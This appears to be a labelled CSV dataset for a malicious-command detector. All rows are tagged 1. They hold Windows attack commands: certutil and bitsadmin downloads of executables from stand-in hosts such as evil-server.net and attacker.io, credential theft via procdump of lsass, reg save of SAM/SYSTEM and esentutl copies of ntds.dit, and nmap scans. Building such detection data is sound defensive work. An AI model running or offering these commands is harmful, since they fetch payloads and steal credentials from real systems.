text,label
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -p- 192.168.78.29,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.126.233,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.83.103,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.98.184,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.45.137",1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sS -p 3389 192.168.148.77,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /create j,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -v -sn 192.168.93.122/24,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -v -sn 192.168.107.164/24,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -p- 192.168.207.105,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.93.229",1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.56.227,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.20.88,1
certutil -urlcache -f https://evil-server.net/p.exe,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.37.15/24,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.189.128,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.11.80,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.178.154,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
"nmap -sS -p 445,139 192.168.176.110",1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /create j,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -A -T4 192.168.187.208,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.190.116,1
certutil -urlcache -f https://temp-storage.com/p.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.67.101",1
certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.251.92",1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.252.142,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.124.203,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.104.228,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.63.15,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.136.130,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.71.49/24,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sS -p 3389 192.168.212.178,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.116.26,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.84.20,1
certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -p- 192.168.162.208,1
certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -v -sn 192.168.208.174/24,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.135.209/24,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.128.133,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -p- 192.168.254.179,1
certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.237.255,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.82.57,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.21.108,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.188.106,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.24.51,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sS -p 3389 192.168.69.212,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.255.107,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -v -sn 192.168.95.148/24,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /create j,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.167.104,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.194.189,1
certutil -urlcache -f https://attacker.io/p.exe,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -p- 192.168.62.66,1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
"nmap -sS -p 80,443,8080 192.168.72.189",1
certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.230.90,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.104.15,1
certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -v -sn 192.168.2.24/24,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.188.93,1
certutil.exe -verifyctl -f http://evil-server.net/x,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -A -T4 192.168.199.205,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.18.156,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin /create j,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap --script=vuln 192.168.38.99,1
certutil.exe -verifyctl -f http://1.2.3.4/x,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -A -T4 192.168.158.6,1
certutil.exe -verifyctl -f http://1.2.3.4/x,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -sS -p 1-65535 192.168.62.184,1
certutil.exe -verifyctl -f http://temp-storage.com/x,1
bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.3.248,1
certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.147.213,1
certutil.exe -verifyctl -f http://attacker.io/x,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
nmap -A -T4 192.168.96.83,1
certutil -urlcache -f https://1.2.3.4/p.exe,1
bitsadmin /create j,1
reg save HKLM\SAM C:\windows\temp\dump.db,1
nmap -p- 192.168.65.35,1
certutil.exe -verifyctl -f http://1.2.3.4/x,1
bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
procdump -ma 684 C:\windows\temp\dump.db,1
nmap -A -T4 192.168.34.164,1
certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
nmap -A -T4 192.168.3.171,1
certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
nmap -sV -sC -O 192.168.123.14,1
certutil -decode p.exe C:\temp\x.exe,1
bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
